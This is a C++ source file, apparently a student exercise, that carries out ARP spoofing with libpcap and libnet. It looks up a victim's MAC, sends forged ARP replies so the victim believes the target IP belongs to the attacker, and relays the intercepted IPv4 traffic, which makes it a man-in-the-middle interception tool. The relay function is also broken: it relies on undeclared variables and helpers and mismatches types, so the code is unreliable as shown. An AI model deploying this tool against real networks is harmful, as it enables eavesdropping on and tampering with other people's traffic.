#include <pcap.h>
#include "arphdr.h"
#include "ethhdr.h"
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <cstdio>
#include <libnet.h>
#include <netinet/in.h>

#define MAC_SIZE 6

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)



std::string checkSend(const u_char* pac){
    struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)pac;
    struct libnet_ipv4_hdr *ip_hdr=(struct libnet_ipv4_hdr*)(pac+sizeof(struct libnet_ethernet_hdr));

    char src_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip, INET_ADDRSTRLEN);
    // pac's ipv4_src return in string
    std::string sdr(src_ip);  

    return sdr;
}

std::string getMyIp(const char* dev) {
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Fail to get interface IP address - socket() failed - %m\n");
        return "";  // 에러 시 빈 문자열 반환
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        printf("Fail to get interface IP address - ioctl(SIOCGIFADDR) failed - %m\n");
        close(sockfd);
        return "";  // 에러 시 빈 문자열 반환
    }

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    std::string ip_address = inet_ntoa(ipaddr->sin_addr);

    close(sockfd);

    return ip_address;
}
std::string getSenderMac(std::string sdr,const char* dev,std::string mymac) {
    
    char errbuf[PCAP_ERRBUF_SIZE];
    const char* sender = sdr.c_str();
    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return "error";
    }
    EthArpPacket myPacket;
    myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
	myPacket.eth_.type_ = htons(EthHdr::Arp);

	myPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	myPacket.arp_.pro_ = htons(EthHdr::Ip4);
	myPacket.arp_.hln_ = Mac::SIZE;
	myPacket.arp_.pln_ = Ip::SIZE;
	myPacket.arp_.op_ = htons(ArpHdr::Request);  
	// myPacket.arp_.smac_ = Mac("00:00:00:00:00:00"); -> after getMyMac() 
	// myPacket.arp_.sip_ = htonl(Ip("0.0.0.0"));  -> after getMyIp()
	myPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
	myPacket.arp_.tip_ = htonl(Ip(sender));
    printf("mymac is %s\n\n",mymac.c_str());

    myPacket.eth_.smac_=Mac(mymac);
    myPacket.arp_.smac_=Mac(mymac);
    myPacket.arp_.sip_=htonl(Ip(getMyIp(dev)));
    int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&myPacket), sizeof(EthArpPacket) );
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    while (true) {
        
        struct pcap_pkthdr* header;
        const u_char* responsePacket;
        int res = pcap_next_ex(handle, &header, &responsePacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return "error";
        }
        
        // detection for eth-arp packet(sender'sip)
        EthArpPacket* recvPacket = (EthArpPacket*)responsePacket;

        if (ntohs(recvPacket->eth_.type_) != EthHdr::Arp) {
            continue;
        }
        if(ntohs(recvPacket->arp_.op_) != ArpHdr::Reply) {
            continue;
        }
        if(recvPacket->arp_.sip_ != myPacket.arp_.tip_) {
            continue;
        }          

        std::string sdr_mac=static_cast<std::string>(recvPacket->arp_.smac_);
        pcap_close(handle);
        return sdr_mac;
    }
}
std::string getMyMac(const char* dev) {
    struct ifreq ifr;
    int sockfd, ret;
    char macString[18];  // Enough space for MAC address in string format

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return "";
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        printf("Fail to get interface MAC address - ioctl(SIOCGIFHWADDR) failed - %m\n");
        close(sockfd);
        return "";
    }

    close(sockfd);

    // Convert the MAC address bytes to string format
    sprintf(macString, "%02X:%02X:%02X:%02X:%02X:%02X", 
        (unsigned char)ifr.ifr_hwaddr.sa_data[0],
        (unsigned char)ifr.ifr_hwaddr.sa_data[1],
        (unsigned char)ifr.ifr_hwaddr.sa_data[2],
        (unsigned char)ifr.ifr_hwaddr.sa_data[3],
        (unsigned char)ifr.ifr_hwaddr.sa_data[4],
        (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

    return std::string(macString);
}

bool sendArpSpoof(std::string sI,std::string tI,const char* dev,std::string sM,std::string mM) {

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return false;
    }    

    EthArpPacket myPacket;

	myPacket.eth_.dmac_ = Mac(sM); 
	myPacket.eth_.type_ = htons(EthHdr::Arp);
    myPacket.eth_.smac_ = Mac(mM);

	myPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	myPacket.arp_.pro_ = htons(EthHdr::Ip4);
	myPacket.arp_.hln_ = Mac::SIZE;
	myPacket.arp_.pln_ = Ip::SIZE;
	myPacket.arp_.op_ = htons(ArpHdr::Reply);  
	myPacket.arp_.smac_ = Mac(mM);  
	myPacket.arp_.sip_ = htonl(Ip(tI));  
	myPacket.arp_.tmac_ = Mac(sM);
	myPacket.arp_.tip_ = htonl(Ip(sI));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&myPacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    printf("Spoofed ARP %s은 이제  %s를 attacker로 봅니다.\n", sI.c_str(),tI.c_str());
    pcap_close(handle);
    return true;
}
bool isBroadcast(const u_char *packet){
    struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
    printf("ETHER_ADDR_LEN is %d\n",ETHER_ADDR_LEN);
    for (int i = 0; i < ETHER_ADDR_LEN; ++i) {
        if (eth_hdr->ether_dhost[i] != 0xFF) {
            printf("ether_dhost[%d] is %02x, ",i,eth_hdr->ether_dhost[i]);
            return false;
        }
        printf("\n");
    }
    return true;
}
void relay_thread(const u_char* pac,const char* dev,std::string tm) {
    
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return;
    }    
    
    struct pcap_pkthdr* header;  // header pcap gives us


    // loop for packet capturing
    while (1) {
        m.lock();
        printf("realy is on thread\n\n");
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0){ 
            printf("res error\n");
            m.unlock();
            std::this_thread::yield();
            continue;}
        if (res == -1 || res == -2){
            m.unlock();
            printf("res==-1 or res==-2 continue\n\n");
            std::this_thread::yield();
            break;
        }

        //Ip packet parsing
        // check Eth_type -> if ipv4 -> relay
        struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)packet;
        struct libnet_ipv4_hdr *ip_hdr=(struct libnet_ipv4_hdr*)(packet+sizeof(struct libnet_ethernet_hdr));
        char src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];
        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP){
            //printf("293 line continue\n\n");
            m.unlock();
            std::this_thread::yield();
            continue;}
        inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &(ip_hdr->ip_dst), dst_ip, INET_ADDRSTRLEN);
        if (strcmp(src_ip, sI) != 0 ){
            //printf("src_ip is : %s, sI is : %s\n\n",src_ip,sI);
            //printf("dst_ip is : %s, tI is : %s\n\n",dst_ip,tI);
            //printf("strcmp(src_ip,si)!=0 여기소 continue\n\n");
            m.unlock();
            std::this_thread::yield();
            continue;
        } 

        //printf("pass!\n");
        // modify smac to mine (attacker)
        //printf("pass2!\n");
        unsigned char *m_mac= getMyMac(dev);
        if (m_mac == NULL) {
            fprintf(stderr, "Could not get MAC address.\n");
            m.unlock();
            std::this_thread::yield();
            return;
        }

        const char* d_mac = ip_to_mac[std::string(tI)].c_str();
	    std::cout << "d_mac is " << d_mac << std::endl;
        std::cout << "mac addr is "<< ip_to_mac[std::string(dst_ip)].c_str()<<"\n";
 
        uint8_t d_bytes[6];
        uint8_t s_bytes[6];
        if (convert_mac(d_mac, d_bytes)) {
                memcpy(eth_hdr->ether_dhost, d_bytes, 6);
        } else {
                printf("Failed to convert MAC addresses.\n");
        }

        free(m_mac);         
        //send to target
        if (header->len > MTU) {
            printf("jumbo frame\n");
            m.unlock();
            std::this_thread::yield();
            continue;
        } else if (pcap_sendpacket(handle, packet, header->len) != 0) {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
            m.unlock();
            std::this_thread::yield();
            return;
        }

        m.unlock();
        printf("good!\n");
        std::this_thread::yield();
    }
    pcap_close(handle);
} 